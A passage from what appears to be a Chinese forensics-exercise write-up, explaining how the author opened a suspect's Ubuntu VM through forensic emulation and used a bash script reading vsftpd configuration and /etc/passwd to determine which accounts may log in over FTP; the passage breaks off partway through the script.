&lt;p&gt;&lt;strong&gt;E. ftpuser&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从这一步开始，只靠火眼是不行的了，我们必须想办法登录嫌疑人使用的ubuntu虚拟机&lt;/p&gt;
&lt;p&gt;首先我的想法是直接从火眼检材里面导出储存有虚拟机的文件夹，可是导出的却无法使用，总是提示&amp;quot;找不到ubuntu 64-bit.vmdk&amp;quot;，即使修改了.vmx文件，去掉路径空格也没有用，而且导出文件的好几个.vmdk似乎混在一起了，分卷大小很奇怪&lt;/p&gt;
&lt;p&gt;在之后，我想直接在仿真了嫌疑人windows的虚拟机里使用这个虚拟机，结果可能是因为我的电脑没有关闭hyper-v和vbs，让虚拟机不能使用虚拟化功能，而手动关闭需要做的操作太麻烦也太未知，遂放弃&lt;/p&gt;
&lt;p&gt;最后成功的方案：&lt;/p&gt;
&lt;p&gt;安装好vmvare tools之后，按照路径把windows虚拟机里面存放ubuntu的文件夹复制到本机电脑，因为不知道密码所以把.vmdk交给火眼仿真，让火眼重置并生成新的虚拟机，最后登录再使用ssh链接（方便操作）即可&lt;/p&gt;
&lt;p&gt;回到题目，判断ftp使用者的第一步是知道这台服务器上安装了哪一种ftp，使用下面命令查看：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ps aux | grep ftp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815200408543&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815200408543.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815200408543.png&#34; alt=&#34;image-20250815200408543&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这里可以看到是vsftp&lt;/p&gt;
&lt;p&gt;具体判断方式需要审查vsftpd的黑白名单，结合uid和shell的允许与否，整理成下面的shell脚本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;CONFIG&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;/etc/vsftpd.conf&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;FTPUSERS&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;/etc/vsftpd.ftpusers&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;USER_LIST_FILE&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;/etc/vsftpd.user_list&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; ! systemctl is-active --quiet vsftpd; &lt;span style=&#34;color:#c678dd&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;vsftpd 未运行&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e5c07b&#34;&gt;exit&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt; ! -f &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$CONFIG&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;配置文件不存在&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#e5c07b&#34;&gt;exit&lt;/span&gt; 1; &lt;span style=&#34;color:#56b6c2&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;LOCAL_ENABLE&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;$(&lt;/span&gt;grep -v &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;^#&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$CONFIG&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; | grep -E &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;local_enable=.*YES&amp;#39;&lt;/span&gt; &amp;gt;/dev/null &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; YES &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; NO&lt;span style=&#34;color:#c678dd&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;ANONYMOUS_ENABLE&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;$(&lt;/span&gt;grep -v &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;^#&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$CONFIG&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; | grep -E &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;anonymous_enable=.*YES&amp;#39;&lt;/span&gt; &amp;gt;/dev/null &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; YES &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; NO&lt;span style=&#34;color:#c678dd&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;USERLIST_ENABLE&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;$(&lt;/span&gt;grep -v &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;^#&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$CONFIG&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; | grep -E &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;userlist_enable=.*NO&amp;#39;&lt;/span&gt; &amp;gt;/dev/null &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; NO &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; YES&lt;span style=&#34;color:#c678dd&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;USERLIST_DENY&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;$(&lt;/span&gt;grep -v &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;^#&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$CONFIG&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; | grep -E &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;userlist_deny=.*NO&amp;#39;&lt;/span&gt; &amp;gt;/dev/null &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; NO &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; YES&lt;span style=&#34;color:#c678dd&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;BLACKLIST&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt; -f &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$FTPUSERS&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;IFS&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;read&lt;/span&gt; -r line; &lt;span style=&#34;color:#c678dd&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#56b6c2&#34;&gt;[[&lt;/span&gt; -z &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$line&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$line&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;~ ^# &lt;span style=&#34;color:#56b6c2&#34;&gt;]]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;BLACKLIST&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;+=(&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$line&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;done&lt;/span&gt; &amp;lt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$FTPUSERS&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;USER_LIST&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt; -f &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$USER_LIST_FILE&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;IFS&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;read&lt;/span&gt; -r line; &lt;span style=&#34;color:#c678dd&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#56b6c2&#34;&gt;[[&lt;/span&gt; -z &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$line&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$line&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;~ ^# &lt;span style=&#34;color:#56b6c2&#34;&gt;]]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;USER_LIST&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;+=(&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$line&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;done&lt;/span&gt; &amp;lt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$USER_LIST_FILE&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;USERS&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;IFS&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;: &lt;span style=&#34;color:#e5c07b&#34;&gt;read&lt;/span&gt; -r username _ uid _ _ _ shell; &lt;span style=&#34;color:#c678dd&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$uid&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; -ge &lt;span style=&#34;color:#d19a66&#34;&gt;1000&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[[&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$shell&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; !&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; /usr/sbin/nologin &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$shell&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; !&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; /bin/false &lt;span style=&#34;color:#56b6c2&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#c678dd&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;USERS&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;+=(&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$username&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;done&lt;/span&gt; &amp;lt; /etc/passwd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;ALLOWED_USERS&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$LOCAL_ENABLE&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;YES&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#c678dd&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;for&lt;/span&gt; u in &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;USERS&lt;/span&gt;[@]&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#c678dd&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#56b6c2&#34;&gt;[[&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;BLACKLIST&lt;/span&gt;[*]&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt; &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; *&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$u&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt; &amp;#34;&lt;/span&gt;* &lt;span style=&#34;color:#56b6c2&#34;&gt;]]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$USERLIST_ENABLE&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;YES&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#c678dd&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$USERLIST_DENY&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;YES&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#c678dd&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#56b6c2&#34;&gt;[[&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;USER_LIST&lt;/span&gt;[*]&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt; &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; *&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$u&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt; &amp;#34;&lt;/span&gt;* &lt;span style=&#34;color:#56b6c2&#34;&gt;]]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#c678dd&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#56b6c2&#34;&gt;[[&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;USER_LIST&lt;/span&gt;[*]&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt; &amp;#34;&lt;/span&gt; !&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; *&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$u&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt; &amp;#34;&lt;/span&gt;* &lt;span style=&#34;color:#56b6c2&#34;&gt;]]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#c678dd&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;fi&lt;/span&gt;
